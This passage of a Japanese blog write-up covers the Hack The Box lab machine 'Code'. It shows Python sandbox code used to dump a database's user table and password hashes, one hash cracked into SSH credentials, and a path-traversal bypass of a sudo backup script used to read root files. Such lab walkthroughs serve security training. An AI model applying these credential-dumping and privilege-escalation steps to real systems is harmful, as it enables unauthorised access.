+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="n">output</span><span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;code&#39;</span><span class="p">:</span> <span class="s1">&#39;print(locals())</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;old_stdout&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">_io</span><span class="o">.</span><span class="n">TextIOWrapper</span> <span class="n">name</span><span class="o">=</span><span class="s1">&#39;&lt;stdout&gt;&#39;</span> <span class="n">mode</span><span class="o">=</span><span class="s1">&#39;w&#39;</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;redirected_output&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">_io</span><span class="o">.</span><span class="n">StringIO</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7fd4ec4cb820</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;keyword&#39;</span><span class="p">:</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">}</span>
+</span></span></code></pre></div><p><code>SQLAlchemy</code>で<code>db</code>や<code>User</code>が使われていることがわかる．</p>
+<p><code>User</code>テーブルのコラムを表示させる．</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">User</span><span class="o">.</span><span class="n">__table__</span><span class="o">.</span><span class="n">columns</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="n">output</span><span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="n">ReadOnlyColumnCollection</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">user</span><span class="o">.</span><span class="n">password</span><span class="p">)</span>
+</span></span></code></pre></div><p>要素を表示させる．</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">User</span><span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">user</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">user</span><span class="o">.</span><span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="n">output</span><span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">User</span> <span class="mi">1</span><span class="o">&gt;</span> <span class="mi">1</span> <span class="n">development</span> <span class="mi">759</span><span class="n">b74ce43947f5f4c91aeddc3e5bad3</span> <span class="o">&lt;</span><span class="n">User</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="mi">2</span> <span class="n">martin</span> <span class="mi">3</span><span class="n">de6f30c4a09c27fc71932bfc68474be</span>
+</span></span></code></pre></div><p><code>3de6f30c4a09c27fc71932bfc68474be</code>を <a href="https://crackstation.net/"target="_blank" rel="noopener noreferrer">https://crackstation.net/</a> で求める．</p>
+<pre tabindex="0"><code>Hash	Type	Result
+3de6f30c4a09c27fc71932bfc68474be	md5	    nafeelswordsmaster
+</code></pre><p>よって，<code>martin</code> / <code>nafeelswordsmaster</code> でsshする．</p>
+<pre tabindex="0"><code>$ ssh martin@10.10.11.62
+</code></pre><pre tabindex="0"><code>martin@code:~$ sudo -l
+Matching Defaults entries for martin on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User martin may run the following commands on localhost:
+    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
+
+martin@code:~$ cd backups/
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  home  root  task.json
+martin@code:~/backups$ cat task.json
+{
+        &#34;destination&#34;: &#34;/home/martin/backups/&#34;,
+        &#34;multiprocessing&#34;: true,
+        &#34;verbose_log&#34;: false,
+        &#34;directories_to_archive&#34;: [
+                &#34;/home/app-production/app&#34;
+        ],
+
+        &#34;exclude&#34;: [
+                &#34;.*&#34;
+        ]
+}
+
+martin@code:~/backups$ vi task.json
+{
+        &#34;destination&#34;: &#34;/home/martin/backups/&#34;,
+        &#34;multiprocessing&#34;: true,
+        &#34;verbose_log&#34;: false,
+        &#34;directories_to_archive&#34;: [
+                &#34;/home/app-production/user.txt&#34;
+        ],
+
+        &#34;exclude&#34;: [
+                &#34;.*&#34;
+        ]
+}
+
+
+martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
+2025/06/04 00:08:16 🍀 backy 1.2
+2025/06/04 00:08:16 📋 Working with task.json ...
+2025/06/04 00:08:16 💤 Nothing to sync
+2025/06/04 00:08:16 📤 Archiving: [/home/app-production/user.txt]
+2025/06/04 00:08:16 📥 To: /home/martin/backups ...
+2025/06/04 00:08:16 📦
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2     home  task.json
+code_home_app-production_user.txt_2025_June.tar.bz2  root
+
+martin@code:~/backups$ tar -xjf code_home_app-production_user.txt_2025_June.tar.bz2
+
+martin@code:~/backups/home/app-production$ cat user.txt
+20ddb8c8a3d5b21890f4ab37b9954bb6
+</code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
+<pre tabindex="0"><code>martin@code:~/backups$ vi task.json
+{
+        &#34;destination&#34;: &#34;/home/martin/backups/&#34;,
+        &#34;multiprocessing&#34;: true,
+        &#34;verbose_log&#34;: false,
+        &#34;directories_to_archive&#34;: [
+                &#34;/home/....//root&#34;
+        ]
+}
+
+martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
+2025/06/04 00:26:05 🍀 backy 1.2
+2025/06/04 00:26:05 📋 Working with task.json ...
+2025/06/04 00:26:05 💤 Nothing to sync
+2025/06/04 00:26:05 📤 Archiving: [/home/../root]
+2025/06/04 00:26:05 📥 To: /home/martin/backups ...
+2025/06/04 00:26:05 📦
+
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  home
+code_home_.._root_2025_June.tar.bz2               root
+task.json
+
+martin@code:~/backups$ tar -xjf code_home_.._root_2025_June.tar.bz2
+martin@code:~/backups$ ls root
+root.txt  scripts
+martin@code:~/backups$ cat root/root.txt
+97c3e8d1f4eb9cc328e56fc770eaeffc
+</code></pre><p>参考：
+<a href="https://www.cnblogs.com/QiSamaQwQ/p/18799928"target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/QiSamaQwQ/p/18799928</a></p></article><section class="article labels"><a class="category" href="/starknote/categories/security/">Security</a><a class="category" href="/starknote/categories/programming/">Programming</a><a class="tag" href="/starknote/tags/htb/">HTB</a></section><section class="article author"><img class="avatar" src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/stable-diffusion/immy.png" alt><p class="name">しゅたるく (Stark)</p><div class="details"><a class="item" href="https://github.com/stark2420" target="_blank" rel="noopener noreferrer"><span class="iconfont icon-github"></span>&nbsp;stark2420</a><a class="item" href="https://twitter.com/stark_puyo" target="_blank" rel="noopener noreferrer"><span class="iconfont icon-twitter"></span>&nbsp;@stark_puyo</a></div>
+</section>
+</div>
+
+<button id="toggle-button" class="nomal-style">
+  <h1>目次</h1>
+</button>
+<div id="toc-container" class="toc-container">
+  
+      <h2><a href="#top">目次</a></h2>
+      <div id="toc" class="toc">
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#user-flag">User Flag</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+      </div>
+  
+</div>
+
+<script>
+  
+  document.querySelectorAll('.toc-container a').forEach(link => {
+    link.addEventListener('click', function() {
+      
+      if (window.innerWidth < 1600) {
+        
+        const tocContainer = document.querySelector('.toc-container');
+        if (tocContainer) {
+          tocContainer.style.display = 'none';
+        }
+      }
+    });
+  });
+
+  
+  document.getElementById('toggle-button').addEventListener('click', function() {
+    var toc = document.getElementById('toc-container');
+    var button = document.getElementById('toggle-button');
+    
+    
+    if (toc.style.display === 'none') {
+      toc.style.display = 'block';
+      button.innerHTML = '<h1>目次</h1>';  
+    } else {
+      toc.style.display = 'none';
+      button.innerHTML = '<h1>目次</h1>';  
+    }
+  });
+
+  function highlightActiveTocItem() {
+    const tocItems = document.querySelectorAll('.toc a');
+
+    tocItems.forEach(item => {
+      const targetId = item.getAttribute('href').substring(1); 
+      const targetElement = document.getElementById(targetId);
+
+      if (targetElement) {
+        const rect = targetElement.getBoundingClientRect();
+        
+        
+        const isInViewport = rect.top <= 200 && rect.bottom > 0;
+
+        if (isInViewport) {
+          
+          tocItems.forEach(item => {
+            item.classList.remove('active');
+          });
+          
+          item.classList.add('active');
+        }
+      }
+    });
+  }
+
+  
+  window.addEventListener('scroll', highlightActiveTocItem);
+  document.addEventListener('DOMContentLoaded', highlightActiveTocItem);  
+</script>
+
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/starknote/post/seccon-beginners-ctf-2025/"><span class="iconfont icon-article"></span>SECCON Beginners CTF 2025 Writeup</a></p><p><a class="link" href="/starknote/post/htb/htb-dog/"><span class="iconfont icon-article"></span>HTB Dog</a></p></section><section class="article discussion"><div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "starknote" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+		<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+		<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+	</section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">©2020 Notepadium.</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank" rel="noopener noreferrer">Notepadium</a>
+<a href='https://ipv6-test.com/validate.php?url=referer'
+  ><img src='https://ipv6-test.com/button-ipv6-80x15.png' 
+        alt='ipv6 ready' title='ipv6 ready' border='0' 
+/></a>
+</p></div></section><script defer type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML" integrity="sha384-e/4/LvThKH1gwzXhdbY2AsjR3rm7LHWyhIG5C0jiRfn8AN2eTN5ILeztWw0H9jmN" crossorigin="anonymous"></script>
+        <script
+            type="text/x-mathjax-config">MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });</script>
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-W1PPPTDK5L"></script>
+      <script>
+        var doNotTrack = false;
+        if ( true ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-W1PPPTDK5L');
+        }
+      </script></body>
+
+</html>
